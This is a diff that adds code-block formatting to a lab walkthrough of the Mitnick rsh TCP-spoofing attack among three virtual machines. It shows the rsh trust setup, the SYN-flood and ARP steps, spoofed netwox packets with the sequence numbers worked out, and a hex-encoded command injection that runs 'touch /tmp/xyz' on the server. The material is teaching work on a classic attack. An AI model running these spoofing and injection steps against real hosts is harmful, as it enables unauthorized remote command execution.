@@ -10,24 +10,32 @@ Background knowledge: In rsh, two TCP connections are needed. One for normal com
 
 step 1. installing rsh on client, server, and the attacker's machine. Run the following two commands on all 3 VMs:
 
+```console
 # sudo apt-get install rsh-redone-client
 # sudo apt-get install rsh-redone-server
+```
 
 step 2. configure rsh on the victim server machine.
 
+```console
 $ touch .rhosts
 $ echo [victim client’s IP address] > .rhosts (replace "victim client's IP address" with the actual IP address)
 $ chmod 644 .rhosts
+```
 
 If the above configuration is correct, you should be able to run the follow command on the victim client machine, and it will show you current date information.
 
+```console
 # rsh [victim server’s IP] date
+```
 
 step 3. simulating the syn flooding attack.
 
 3.1: on the victim server, run:
 
+```console
 # sudo arp -s [victim client’s IP] [victim client’s MAC]
+```
 
 This step is needed so that the server remembers the MAC address of the client, which is needed for the server to send packets to the client.
 
@@ -41,15 +49,21 @@ step 5. create the first TCP connection.
 
 step 5.1: On the attacker's VM, send a spoofed SYN packet to the victim server.
 
+```console
 # sudo netwox 40 --tcp-syn --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 1023 --tcp-dst 514
+```
 
 step 5.2: right after the above command, netwox would show us the sequence number of this SYN packet, let's say it's x. Then in wireshark, identify the SYN-ACK packet coming from the victim server to the victim client and find out its sequence number, let's say it's y. Now we send the ACK packet to complete the TCP 3-way handshake.
 
+```console
 # sudo netwox 40 --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 1023 --tcp-dst 514 --tcp-acknum y+1 --tcp-seqnum x+1
+```
 
 step 5.3: send one ACK packet to the server. This packet carries the command we want to run:
 
+```console
 # sudo netwox 40 --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 1023 --tcp-dst 514 --tcp-acknum y+1 --tcp-seqnum x+1 --tcp-data "393039300073656564007365656400746f756368202f746d702f78797a00" 
+```
 
 note: step 5.2 and step 5.3 are the same command, except that --tcp-data part.
 
@@ -57,7 +71,9 @@ step 6. create the second TCP connection. After the above ACK packet, the server
 
 step 6.1: 
 
+```console
 # sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 9090 --tcp-dst 1023 --tcp-acknum z+1
+```
 
 Verification steps:
 
@@ -71,13 +87,17 @@ Note: In netwox 40, --tcp-data specifies the data you want to transfer, and in o
 
 thus, in order to inject a command "touch /tmp/xyz", the data we should inject is "9090\x00seed\x00seed\x00touch /tmp/xyz\x00", and then we need to convert it into hex numbers:
 
+```console
 $ python
 >>> "9090\x00seed\x00seed\x00touch /tmp/xyz\x00".encode("hex")
 '393039300073656564007365656400746f756368202f746d702f78797a00'
+```
 
 Note 2: In the attacking steps, right after step 1.1, we need to run step 1.2 as soon as possible, otherwise the server will RESET the 1st TCP connection; similarly, right after step 1.3, we need to run step 2.1 as soon as possible, otherwise the server will RESET the 2nd TCP connection. Therefore, writing a sniffing-and-spoofing script would be the better way to perform this attack.
 
 Alternatively, we can run these two commands on the server so that it does not RESET that fast.
 
+```console
 # sudo sysctl -w net.ipv4.tcp_syn_retries=20
 # sudo sysctl -w net.ipv4.tcp_synack_retries=20
+```
